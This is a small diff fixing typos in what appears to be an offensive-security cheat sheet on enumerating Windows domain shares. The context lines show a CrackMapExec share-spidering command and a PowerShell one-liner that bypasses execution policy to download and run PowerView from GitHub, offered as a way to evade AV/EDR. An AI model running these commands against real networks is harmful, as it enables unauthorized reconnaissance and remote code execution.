@@ -12,13 +12,13 @@ Dump all shares via CrackMapExec :
 cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
 ```
 
-If CME is detect by AV/EDR, use PowerShell one-liner PowerView :
+If CME is detected by AV/EDR, use PowerShell one-liner PowerView :
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"
 ```
 
-Then, a lot a of functionalities can be used. To find all domain shares :
+Then, a lot of functionalities can be used. To find all domain shares :
 
 ```markdown
 Find-DomainShare -CheckShareAccess
